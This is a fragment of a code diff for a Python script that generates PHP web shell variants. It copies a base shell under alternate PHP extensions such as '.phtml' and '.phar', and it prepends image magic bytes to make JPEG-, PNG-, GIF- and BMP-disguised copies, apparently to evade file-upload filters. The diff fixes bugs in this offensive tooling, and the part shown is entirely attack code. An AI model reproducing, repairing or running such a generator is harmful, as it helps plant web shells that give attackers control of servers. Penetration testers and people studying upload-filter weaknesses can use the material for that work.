@@ -21,16 +21,16 @@ def main(args):
         fp.write(text)
     # duplicate shell using different php extensions
     php_extensions = [".php3", ".php4", ".php5", ".php7", ".phtml", ".phps", ".pht", ".phar"]
-    for ext in extensions:
+    for ext in php_extensions:
         new_file = os.path.join(shells_dir, f"shell{ext}")
         shutil.copy(base_filename, new_file)
     # duplicate shell with different image extensions and file signatures
     images = [
-        ('jpg', bytes([0xFF, 0xD8, 0xFF, 0xD8]),
-        ('jpeg', bytes([0xFF, 0xD8, 0xFF, 0xD8]),
-        ('png', bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]),
-        ('gif', bytes([0x47, 0x49, 0x46, 0x38, 0x37, 0x61]),
-        ('bmp', bytes([0x42, 0x4D]),
+        ('jpg', bytes([0xFF, 0xD8, 0xFF, 0xD8])),
+        ('jpeg', bytes([0xFF, 0xD8, 0xFF, 0xD8])),
+        ('png', bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])),
+        ('gif', bytes([0x47, 0x49, 0x46, 0x38, 0x37, 0x61])),
+        ('bmp', bytes([0x42, 0x4D])),
     ]
     php_extensions.append('.php')
     with open(base_filename, 'rb') as fp:
